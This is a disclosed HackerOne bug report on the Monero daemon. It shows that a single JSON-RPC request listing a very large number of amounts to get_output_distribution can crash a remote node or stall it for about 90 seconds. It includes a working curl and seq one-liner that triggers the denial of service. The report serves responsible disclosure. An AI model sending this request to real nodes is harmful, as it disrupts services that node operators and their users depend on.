# RPC call crashes node

## Report Details
- **Report ID**: 1379707
- **URL**: https://hackerone.com/reports/1379707
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-10-24T15:19:11.435Z
- **Disclosed**: 2022-08-20T03:41:29.301Z

## Reporter
- **Username**: xfang
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: monero

## Vulnerability Information
## Summary:
Passing a large list of amounts to the `get_output_distribution` call crashes a remote node, after maybe 90 seconds of keeping it busy.

## Releases Affected:

  * Probably all

## Steps To Reproduce:
```
values=`echo $(seq 0 500 900000)|sed -e 's/ /,/g'` ; curl http://127.0.0.1:38081/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"get_output_distribution","params":{"amounts": ['$values'], "from_height": 100, "cumulative": false}' -H 'Content-Type: application/json'
```
Reduce the 900000 number a bit and instead of crashing the daemon, it'll do a denial of service, like 90 seconds per call, making it hard for anyone else to use that call.


## Supporting Material/References:

  * Unnecessary. The attack is  straightforward and compelling.

## Housekeeping

Payment address: ████

## Impact

An attacker can crash any remote node that exposes `get_output_distribution` or tie up availability of that function call. I think that's serious.

## Attachments
No attachments
